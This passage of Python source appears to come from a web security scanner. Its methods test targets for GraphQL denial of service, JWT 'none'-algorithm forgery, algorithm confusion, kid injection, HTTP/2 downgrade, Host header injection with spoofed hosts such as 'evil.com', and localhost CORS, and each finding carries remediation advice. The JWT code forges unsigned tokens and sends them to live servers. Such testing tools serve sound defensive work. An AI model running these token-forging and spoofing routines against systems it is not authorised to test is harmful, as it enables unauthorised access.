                                                    severity=Severity.MEDIUM,
                                                    title=f"GraphQL DoS Vector: {dos_desc}",
                                                    description=(
                                                        f"GraphQL endpoint accepts {dos_desc} queries. "
                                                        "This can be abused for denial of service."
                                                    ),
                                                    cwe_id="CWE-400",
                                                    cwe_name="Uncontrolled Resource Consumption",
                                                    url=gql_url,
                                                    evidence=f"DoS payload type: {dos_desc}",
                                                    remediation=(
                                                        "Implement query depth limiting, complexity scoring, "
                                                        "and rate limiting on GraphQL endpoints."
                                                    ),
                                                    cvss_score=5.3,
                                                    metadata={"dos_type": dos_desc},
                                                )
                                            )

                                    except httpx.TimeoutException:
                                        findings.append(
                                            self._create_finding(
                                                severity=Severity.HIGH,
                                                title=f"GraphQL DoS Confirmed: {dos_desc}",
                                                description=(
                                                    f"GraphQL endpoint timed out on {dos_desc} query. "
                                                    "This confirms vulnerability to DoS attacks."
                                                ),
                                                cwe_id="CWE-400",
                                                cwe_name="Uncontrolled Resource Consumption",
                                                url=gql_url,
                                                evidence=f"Timeout on {dos_desc} payload",
                                                remediation="Implement strict query complexity limits.",
                                                cvss_score=7.5,
                                            )
                                        )

                        except json.JSONDecodeError:
                            pass

            except Exception as e:
                logger.debug("graphql_test_error", path=gql_path, error=str(e))

        return findings

    async def _attack_jwt_confusion(
        self,
        url: str,
        headers: dict[str, str],
        cookies: list[dict[str, Any]],
    ) -> list[Finding]:
        """
        Attack 8: JWT Key Confusion.

        Tests RS256 to HS256 algorithm switching, null signature,
        and kid header injection.

        CWE-327: Use of a Broken or Risky Cryptographic Algorithm
        """
        findings: list[Finding] = []

        # Find JWT tokens in cookies and headers
        jwt_pattern = r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
        jwt_tokens: list[tuple[str, str]] = []  # (token, source)

        # Check Authorization header
        auth_header = headers.get("Authorization", headers.get("authorization", ""))
        if auth_header:
            matches = re.findall(jwt_pattern, auth_header)
            jwt_tokens.extend((m, "Authorization header") for m in matches)

        # Check cookies
        for cookie in cookies:
            cookie_value = str(cookie.get("value", ""))
            matches = re.findall(jwt_pattern, cookie_value)
            jwt_tokens.extend((m, f"Cookie: {cookie.get('name', 'unknown')}") for m in matches)

        for token, source in jwt_tokens:
            try:
                # Decode without verification to analyze
                try:
                    decoded_header = jwt.get_unverified_header(token)
                except jwt.exceptions.DecodeError:
                    continue

                original_alg = decoded_header.get("alg", "unknown")

                # Test 1: Algorithm none attack
                none_findings = await self._test_jwt_none_algorithm(url, token, source)
                findings.extend(none_findings)

                # Test 2: Algorithm confusion (RS256 -> HS256)
                if original_alg.startswith("RS"):
                    confusion_findings = await self._test_jwt_algorithm_confusion(
                        url, token, source, original_alg
                    )
                    findings.extend(confusion_findings)

                # Test 3: Kid header injection
                kid_findings = await self._test_jwt_kid_injection(url, token, source)
                findings.extend(kid_findings)

            except Exception as e:
                logger.debug("jwt_analysis_error", source=source, error=str(e))

        return findings

    async def _test_jwt_none_algorithm(
        self,
        url: str,
        original_token: str,
        source: str,
    ) -> list[Finding]:
        """Test JWT none algorithm bypass."""
        findings: list[Finding] = []

        try:
            # Decode original token
            parts = original_token.split(".")
            if len(parts) != 3:
                return findings

            # Decode header and payload
            header_b64 = parts[0]
            payload_b64 = parts[1]

            # Pad base64 if needed
            header_b64_padded = header_b64 + "=" * (4 - len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64_padded))

            # Create none algorithm token
            for none_variant in ["none", "None", "NONE", "nOnE"]:
                header["alg"] = none_variant
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip("=")

                # Token with no signature
                forged_token = f"{new_header}.{payload_b64}."

                # Test the forged token
                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=self.config.verify_ssl,
                    follow_redirects=True,
                ) as client:
                    test_headers = {
                        "User-Agent": self.config.user_agent,
                        "Authorization": f"Bearer {forged_token}",
                    }

                    response = await client.get(url, headers=test_headers)

                    # Check for success (should fail with proper validation)
                    if response.status_code in [200, 201]:
                        findings.append(
                            self._create_finding(
                                severity=Severity.CRITICAL,
                                title=f"JWT None Algorithm Bypass: {none_variant}",
                                description=(
                                    f"Server accepts JWT with '{none_variant}' algorithm. "
                                    f"Token source: {source}. "
                                    "This allows forging any token without knowing the secret."
                                ),
                                cwe_id="CWE-327",
                                cwe_name="Use of a Broken or Risky Cryptographic Algorithm",
                                url=url,
                                evidence=f"Algorithm: {none_variant}; Response: {response.status_code}",
                                remediation=(
                                    "CRITICAL: Explicitly reject 'none' algorithm in JWT library. "
                                    "Use allowlist for accepted algorithms. "
                                    "Example: jwt.decode(token, key, algorithms=['RS256'])"
                                ),
                                cvss_score=9.8,
                                references=[
                                    "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                                ],
                                metadata={"algorithm": none_variant, "source": source},
                            )
                        )
                        break

        except Exception as e:
            logger.debug("jwt_none_test_error", error=str(e))

        return findings

    async def _test_jwt_algorithm_confusion(
        self,
        url: str,
        original_token: str,
        source: str,
        original_alg: str,
    ) -> list[Finding]:
        """Test JWT algorithm confusion (RS256 -> HS256)."""
        findings: list[Finding] = []

        # This would need the public key to properly test
        # For now, just report if RS256 is used (potential vector)
        findings.append(
            self._create_finding(
                severity=Severity.LOW,
                title=f"JWT Uses Asymmetric Algorithm: {original_alg}",
                description=(
                    f"JWT from {source} uses {original_alg} algorithm. "
                    "If the server is misconfigured to accept HS256 with the public key "
                    "as secret, algorithm confusion attack is possible."
                ),
                cwe_id="CWE-327",
                cwe_name="Use of a Broken or Risky Cryptographic Algorithm",
                url=url,
                evidence=f"Algorithm: {original_alg}",
                remediation=(
                    "Ensure JWT library enforces algorithm matching. "
                    "Use algorithm allowlist: algorithms=['RS256'] only."
                ),
                cvss_score=3.1,
                metadata={"algorithm": original_alg, "source": source},
            )
        )

        return findings

    async def _test_jwt_kid_injection(
        self,
        url: str,
        original_token: str,
        source: str,
    ) -> list[Finding]:
        """Test JWT kid header injection."""
        findings: list[Finding] = []

        try:
            header = jwt.get_unverified_header(original_token)

            if "kid" in header:
                findings.append(
                    self._create_finding(
                        severity=Severity.MEDIUM,
                        title="JWT Contains kid Header",
                        description=(
                            f"JWT from {source} contains 'kid' (key ID) header: {header['kid']}. "
                            "If kid is used in file path or SQL query, injection may be possible."
                        ),
                        cwe_id="CWE-94",
                        cwe_name="Improper Control of Generation of Code ('Code Injection')",
                        url=url,
                        evidence=f"kid value: {header['kid']}",
                        remediation=(
                            "Sanitize kid header before use. Never use in file paths or SQL. "
                            "Map kid to keys using allowlist lookup."
                        ),
                        cvss_score=5.3,
                        metadata={"kid": header["kid"], "source": source},
                    )
                )

        except Exception as e:
            logger.debug("jwt_kid_test_error", error=str(e))

        return findings

    async def _attack_http2_smuggling(
        self,
        url: str,
    ) -> list[Finding]:
        """
        Attack 9: HTTP/2 Smuggling (H2.CL / H2.TE).

        Tests for HTTP/2 specific request smuggling vectors where
        HTTP/2 front-end downgrades to HTTP/1.1 for backend.

        CWE-444: Inconsistent Interpretation of HTTP Requests
        """
        findings: list[Finding] = []

        # Note: Full HTTP/2 smuggling requires low-level socket control
        # httpx uses HTTP/2 when available, but we can't manipulate frames directly
        # We test for indicators of HTTP/2 downgrade scenarios

        try:
            async with httpx.AsyncClient(
                timeout=10.0,
                verify=self.config.verify_ssl,
                http2=True,  # Request HTTP/2
                follow_redirects=True,
            ) as client:
                response = await client.get(
                    url,
                    headers={"User-Agent": self.config.user_agent},
                )

                http_version = response.http_version

                if http_version == "HTTP/2":
                    # HTTP/2 is in use - check for downgrade indicators
                    # Server header might indicate backend
                    server_header = response.headers.get("server", "").lower()
                    via_header = response.headers.get("via", "").lower()

                    downgrade_indicators = [
                        "1.1" in via_header,
                        "http/1" in via_header,
                        "nginx" in server_header and "1." in server_header,
                    ]

                    if any(downgrade_indicators):
                        findings.append(
                            self._create_finding(
                                severity=Severity.MEDIUM,
                                title="HTTP/2 to HTTP/1.1 Downgrade Detected",
                                description=(
                                    "Connection uses HTTP/2 but backend appears to use HTTP/1.1. "
                                    "This architecture may be vulnerable to H2.CL or H2.TE smuggling. "
                                    "Manual testing with specialized tools recommended."
                                ),
                                cwe_id="CWE-444",
                                cwe_name="Inconsistent Interpretation of HTTP Requests",
                                url=url,
                                evidence=f"HTTP version: {http_version}; Via: {via_header}; Server: {server_header}",
                                remediation=(
                                    "Use end-to-end HTTP/2. If downgrade is required, ensure "
                                    "Content-Length is not passed from HTTP/2 pseudo-headers. "
                                    "Consider using HTTP/2 CONNECT for tunneling."
                                ),
                                cvss_score=6.5,
                                references=[
                                    "https://portswigger.net/web-security/request-smuggling/advanced",
                                ],
                                metadata={"http_version": http_version, "via": via_header},
                            )
                        )

        except Exception as e:
            logger.debug("http2_smuggling_test_error", error=str(e))

        return findings

    async def _attack_dns_rebinding_detection(
        self,
        url: str,
        headers: dict[str, str],
    ) -> list[Finding]:
        """
        Attack 10: DNS Rebinding Detection.

        Checks for Host header validation and CORS configuration
        that could enable DNS rebinding attacks.

        CWE-350: Reliance on Reverse DNS Resolution for Security-Critical Action
        """
        findings: list[Finding] = []

        parsed = urlparse(url)
        original_host = parsed.netloc

        # Test 1: Host header manipulation
        malicious_hosts = [
            "evil.com",
            "attacker.local",
            f"evil.{original_host}",
            f"{original_host}.evil.com",
            "127.0.0.1",
            "localhost",
        ]

        for malicious_host in malicious_hosts:
            try:
                async with httpx.AsyncClient(
                    timeout=10.0,
                    verify=self.config.verify_ssl,
                    follow_redirects=False,
                ) as client:
                    # Request with spoofed Host header
                    response = await client.get(
                        url,
                        headers={
                            "User-Agent": self.config.user_agent,
                            "Host": malicious_host,
                        },
                    )

                    # Check if request was processed (not rejected)
                    if response.status_code in [200, 301, 302]:
                        # Check if malicious host is reflected
                        host_reflected = malicious_host in safe_response_text(response)

                        if host_reflected:
                            findings.append(
                                self._create_finding(
                                    severity=Severity.HIGH,
                                    title="Host Header Injection Vulnerability",
                                    description=(
                                        f"Server accepts and reflects arbitrary Host header: {malicious_host}. "
                                        "This enables DNS rebinding attacks, cache poisoning, "
                                        "and password reset poisoning."
                                    ),
                                    cwe_id="CWE-350",
                                    cwe_name="Reliance on Reverse DNS Resolution for Security-Critical Action",
                                    url=url,
                                    evidence=f"Host: {malicious_host} accepted and reflected",
                                    remediation=(
                                        "Validate Host header against allowlist of expected hosts. "
                                        "Never use Host header for URL generation. "
                                        "Configure web server to reject requests with unknown Host."
                                    ),
                                    cvss_score=8.1,
                                    references=[
                                        "https://portswigger.net/web-security/host-header",
                                    ],
                                    metadata={"malicious_host": malicious_host, "reflected": True},
                                )
                            )
                            break

            except Exception as e:
                logger.debug("host_header_test_error", host=malicious_host, error=str(e))

        # Test 2: CORS configuration for localhost
        try:
            async with httpx.AsyncClient(
                timeout=10.0,
                verify=self.config.verify_ssl,
                follow_redirects=True,
            ) as client:
                # Request with localhost origin
                response = await client.get(
                    url,
                    headers={
                        "User-Agent": self.config.user_agent,
                        "Origin": "http://localhost",
                    },
                )

                acao = response.headers.get("Access-Control-Allow-Origin", "")
                acac = response.headers.get("Access-Control-Allow-Credentials", "")

                if acao in ["http://localhost", "localhost", "*"]:
                    severity = Severity.HIGH if acac.lower() == "true" else Severity.MEDIUM

                    findings.append(
                        self._create_finding(
                            severity=severity,
                            title="CORS Allows Localhost Origin",
                            description=(
                                f"Server CORS policy allows localhost origin: {acao}. "
                                f"Credentials: {acac}. "
                                "Combined with DNS rebinding, this allows cross-origin attacks."
                            ),
                            cwe_id="CWE-350",
                            cwe_name="Reliance on Reverse DNS Resolution for Security-Critical Action",
                            url=url,
                            evidence=f"ACAO: {acao}; ACAC: {acac}",
                            remediation=(
                                "Remove localhost from CORS allowlist in production. "
                                "Use specific origin allowlist. "
                                "Never use ACAO: * with credentials."
                            ),
                            cvss_score=7.5 if acac.lower() == "true" else 5.3,
                            metadata={"acao": acao, "acac": acac},
                        )
                    )

        except Exception as e:
            logger.debug("cors_localhost_test_error", error=str(e))

        return findings
